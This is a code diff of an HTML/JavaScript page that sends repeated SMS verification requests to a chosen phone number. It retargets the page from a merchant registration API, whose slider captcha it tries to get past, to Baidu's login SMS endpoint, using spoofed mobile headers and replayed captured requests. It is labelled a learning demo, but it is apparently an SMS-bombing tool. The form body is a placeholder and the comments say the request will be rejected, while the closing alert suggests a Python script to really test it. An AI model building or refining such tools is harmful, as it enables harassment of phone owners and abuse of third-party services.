@@ -68,58 +68,39 @@
 
             alert('手机号: ' + phone + '\n发送次数: ' + count + '\n开始发起请求（仅学习演示）');
 
-            // ============ 接口配置（你抓到的地址） ============
-            const baseUrl = "https://xt.lqfaka.com";
-            // 1.滑块验证码接口
-            const captchaApi = baseUrl + "/merchantApi/common/captchaCheck.html?key=0660f29bc8854a5b3255d0c63bece028";
-            // 2.短信发送接口（目标接口）
-            const sendSmsApi = baseUrl + "/merchantApi/sms/send";
-
-            // 请求头
+            // ====== 百度短信接口配置（你抓包的地址）======
+            const apiUrl = "https://wappass.baidu.com/wp/api/login/sms";
+            
+            // 请求头（和抓包一致）
             const headers = {
-                "Content-Type": "application/json",
-                "Origin": "https://xt.lqfaka.com",
-                "Referer": "https://xt.lqfaka.com/merchant/register",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://wappass.baidu.com",
+                "Referer": "https://wappass.baidu.com/passport/?login&tpl=wise&sms=1",
                 "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
             };
 
             try {
-                console.log("第一步：调用滑块验证接口");
-                // ⚠️ 这里缺少滑块验证对应的请求JSON数据！没有这个无法拿到ticket
-                const captchaRes = await fetch(captchaApi, {
-                    method: "POST",
-                    headers: headers,
-                    body: JSON.stringify({
-                        // 【缺失内容】这里需要填入滑块验证提交的数据，你需要点开抓包详情复制请求体JSON
-                    }),
-                    credentials: "include"
-                });
-                const captchaResult = await captchaRes.json();
-                console.log("验证码返回数据：", captchaResult);
-                const ticket = captchaResult.data?.ticket;
-                if(!ticket){
-                    alert("没有获取到有效的ticket票据！");
-                    return;
-                }
+                // ⚠️ 重要警告：下面这一长串POST表单数据全部是一次性临时值，现在已经失效！
+                // 并且表单里面包含加密签名、tk、time等动态参数，每次访问页面都会变化，无法复用
+                // 前端JS无法自动生成这套动态参数，所以这个请求一定会被服务器拒绝
+                const formBody = "【这里是你抓包得到的超长表单参数，里面包含动态签名，已经失效】";
 
-                console.log("第二步：调用短信发送接口");
-                const smsRes = await fetch(sendSmsApi, {
+                const res = await fetch(apiUrl, {
                     method: "POST",
                     headers: headers,
-                    body: JSON.stringify({
-                        phone: phone,
-                        ticket: ticket
-                        // ⚠️ 这里可能还需要其他参数，需要你查看抓包里面sms/send的完整请求体
-                    }),
+                    body: formBody,
                     credentials: "include"
                 });
-                const smsResult = await smsRes.json();
-                console.log("短信接口返回：", smsResult);
-                alert("请求完成，查看浏览器控制台输出结果");
+
+                const result = await res.text();
+                console.log("接口返回结果：", result);
+                alert("请求完成，请打开浏览器控制台查看输出");
 
             } catch (error) {
                 console.error("请求失败", error);
-                alert(`请求失败！最可能原因：浏览器CORS跨域拦截。\n前端HTML无法直接调用外部API，需要后端程序测试。`);
+                alert(`请求失败！最主要原因：浏览器CORS跨域安全策略拦截了跨域请求。
+前端HTML页面不能直接调用外部网站API。
+如果想要真正测试接口，需要使用Python脚本！`);
             }
         }
     </script>
